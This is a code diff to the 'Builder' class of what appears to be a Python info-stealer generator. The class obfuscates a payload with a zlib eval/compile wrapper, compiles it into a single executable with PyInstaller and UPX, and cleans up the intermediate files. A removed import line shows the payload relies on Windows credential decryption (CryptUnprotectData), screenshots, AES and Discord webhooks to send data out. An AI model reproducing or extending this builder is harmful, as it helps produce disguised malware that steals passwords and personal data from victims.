@@ -239,17 +239,12 @@ class Builder:
         return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"
 
     def encryption(self, filename):
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
-
-        imports = "\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
-        
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')        
         os.system(f"python obfuscation.py {filename}.py")
-        with open(f"obfuscated_{filename}.py", "a") as f:
-            f.write(imports)
 
     def compile(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
-        os.system(f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
+        os.system(f'python -m PyInstaller --onefile --upx-dir=./upx -i NONE --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
@@ -265,7 +260,7 @@ class Builder:
         cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py'}
 
         if self.obfuscation == 'y' and self.compy == 'n':
-            cleans_file.remove(f'./obfuscated_{filename}.py')
+            cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
         elif self.obfuscation == 'y' and self.compy == 'y':
             cleans_file.add(f'./obfuscated_compressed_{filename}.spec')
         elif self.obfuscation == 'n' and self.compy == 'n':
